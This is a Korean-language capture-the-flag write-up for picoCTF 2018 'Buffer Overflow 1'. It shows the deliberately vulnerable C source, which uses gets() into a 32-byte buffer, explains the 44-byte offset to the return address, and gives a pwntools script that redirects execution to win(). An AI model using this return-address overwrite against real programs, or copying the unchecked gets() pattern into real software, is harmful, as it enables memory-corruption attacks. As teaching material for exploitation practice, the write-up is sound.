# picoCTF 2018

<h5> Buffer OverFlow 1 </h5>
<hr>

<h5> Solution </h5>

```c

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include "asm.h"

#define BUFSIZE 32
#define FLAGSIZE 64

void win() {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  printf(buf);
}

void vuln(){
  char buf[BUFSIZE];
  gets(buf);

  printf("Okay, time to return... Fingers Crossed... Jumping to 0x%x\n", get_return_address());
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  puts("Please enter your string: ");
  vuln();
  return 0;
}

```

<p> 이전과 똑같이 버퍼 오버플로우 취약점 환경이 생긴다. </p>
<p> vuln 함수에서 buf를 입력받을때 gets 함수를 사용하는데, 입력값 길이를 검증하지 않아서 오버플로우를 시킬 수 있다. </p>
<p> 이번에는 RET 주소를 조작해서 flag를 출력해주는 win() 함수로 넘겨줘야 한다. </p>

<img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fk.kakaocdn.net%2Fdn%2Fm3djU%2FbtqxSivjZW8%2Fkl8qjqkXPN7Et8s2xrwSu1%2Fimg.png"><br>

<p> 메모리를 보면 우리가 입력주는 값은 vuln+9(lea eax, [ebp-0x28]) 공간에 위치한다. </p>
<p> 0x28 = 40Byte + SFP(4Byte) + RET(win) 으로 페이로드를 구성해주면 된다. </p>

```py
#!/usr/bin/python
  
from pwn import *

p = process('./vuln')

e = ELF('./vuln')

win = e.symbols['win']

payload = "A"*44
payload += p32(win)

p.sendline(payload)

print p.recv()

p.interactive()

p.close()
```